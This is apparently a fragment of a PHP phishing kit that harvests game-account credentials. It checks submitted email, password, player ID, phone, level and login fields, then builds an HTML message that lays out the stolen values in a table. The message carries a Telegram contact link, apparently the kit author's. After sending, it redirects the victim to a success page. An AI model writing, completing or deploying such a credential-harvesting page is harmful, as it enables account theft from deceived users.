...
if($email == "" && $password == "" && $playid == "" && $phone == "" && $level == "" && $login == "" && $swemail == ""){
...
$pesan = '
<center>
<div style="background: url(https://i.ibb.co/q57JtLW/20230327-022132.png) no-repeat;border:2px solid black;background-size: 100% 100%; width: 294; height: 1px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
...
<tr>
<th style="padding:3px;width: 35%; text-align: left;" height="25px"><b>EMAIL</th>
<th style="padding:3px;width: 65%; text-align: center;"><b>'.$swemail.'</th>
</tr>
...
<a style="border:2px solid #000;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#0088CC;" href="https://t.me/ITS_FLASH_OP">TELEGRAM DM</a>
</div>
 <center>
';
...
if($kirim) {
echo "<form id='gungrate' method='POST' action='success.php'>
